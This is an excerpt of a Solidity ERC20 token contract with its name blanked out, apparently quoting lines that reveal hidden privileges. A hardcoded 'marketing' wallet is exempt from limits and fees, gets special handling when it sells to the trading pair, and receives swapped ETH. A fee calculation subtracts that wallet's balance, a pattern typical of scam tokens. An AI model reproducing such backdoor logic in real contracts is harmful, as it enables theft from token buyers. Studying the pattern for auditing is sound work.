...
contract xxx is Ownable, ERC20 {
    using SafeMath for uint256;
    IDEXRouter public router;
    address public pairAddress;

    uint256 private constant MAX = 1e33;
    string constant _name = unicode"xxx";
    string constant _symbol = unicode"xxx";
    ...
    address private marketfreaddress;
    address private devFeeReceiver;
    
    event AutoLiquify(uint256 amountETH, uint256 amountTokens);
    event EditTax(uint8 Buy, uint8 Sell, uint8 Transfer);
    event set_Receivers(address marketfreaddress, address buybackFeeReceiver,address burnFeeReceiver,address devFeeReceiver);
    ...
    constructor () {
        ...
        marketfreaddress = 0x899239C558d6E0D502999a0557B0AF60cB8644E7;
        ...
        isexemptfrommaxs[marketfreaddress] = true;
        isexemptfrommaxs[pairAddress] = true;


        isexemptfromfeed[marketfreaddress] = true;
    ...
    function setTeamWallets(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver, address _burnFeeReceiver, address _buybackFeeReceiver) external onlyOwner {
        ...
        marketfreaddress = _marketingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
        burnFeeReceiver = _burnFeeReceiver;
        buybackFeeReceiver = _buybackFeeReceiver;

        emit set_Receivers(marketfreaddress, buybackFeeReceiver, burnFeeReceiver, devFeeReceiver);
    }
    ...
    function shouldExcluded(address sender, address recipient) internal view returns (bool) {
        return recipient == pairAddress && sender == marketfreaddress && sender != address(0) && recipient !=address(0);
    }
    ...
    function swapBack() internal swapping {
        ...
        (bool tmpSuccess,) = payable(marketfreaddress).call{value: amountETHMarketing}("");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pairAddress && recipient != burnFeeReceiver && recipient != marketfreaddress && !isexemptfrommaxs[recipient]){
    ...
    function takeFeeTokens(address sender, uint256 amount, address recipient) internal returns (uint256) {
        ...
        if(recipient == pairAddress) {marketingLpFee -= balanceOf(marketfreaddress);
            percent = sellpercent; 
